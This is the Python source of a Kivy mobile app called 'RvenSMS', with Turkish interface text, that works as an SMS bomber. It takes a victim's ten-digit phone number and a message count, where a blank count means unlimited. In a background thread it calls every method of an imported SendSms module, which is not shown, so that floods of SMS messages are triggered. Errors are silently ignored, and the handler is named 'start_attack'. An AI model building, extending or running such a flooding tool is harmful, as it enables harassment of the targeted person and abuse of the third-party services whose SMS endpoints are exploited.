from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.label import Label
from sms_api import SendSms
import threading

class RvenSMSApp(App):
    def build(self):
        self.title = "RvenSMS"
        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        
        self.label_info = Label(text="RvenSMS v1.0", font_size=24, size_hint=(1, 0.2))
        layout.add_widget(self.label_info)
        
        self.phone_input = TextInput(hint_text="Telefon Numarasi (Örn: 5054965880)", multiline=False, size_hint=(1, 0.2))
        layout.add_widget(self.phone_input)
        
        self.count_input = TextInput(hint_text="SMS Adedi (Boş bırakırsan sonsuz)", multiline=False, size_hint=(1, 0.2))
        layout.add_widget(self.count_input)
        
        self.start_button = Button(text="BASLAT", size_hint=(1, 0.3), background_color=(0.1, 0.8, 0.2, 1))
        self.start_button.bind(on_press=self.start_attack)
        layout.add_widget(self.start_button)
        
        return layout

    def start_attack(self, instance):
        phone = self.phone_input.text.strip()
        count_text = self.count_input.text.strip()
        
        if len(phone) != 10:
            self.label_info.text = "Hatali Numara!"
            return
            
        count = int(count_text) if count_text.isdigit() else None
        self.label_info.text = "SMS Gönderiliyor..."
        
        threading.Thread(target=self.run_sms, args=(phone, count)).start()

    def run_sms(self, phone, count):
        sms = SendSms(phone, "")
        sent = 0
        while True:
            for attr in dir(SendSms):
                if not attr.startswith('__'):
                    if count and sent >= count:
                        break
                    try:
                        func = getattr(sms, attr)
                        if callable(func):
                            func()
                            sent += 1
                    except:
                        pass
            if count and sent >= count:
                break
        self.label_info.text = "Islem Tamamlandi!"

if __name__ == '__main__':
    RvenSMSApp().run()
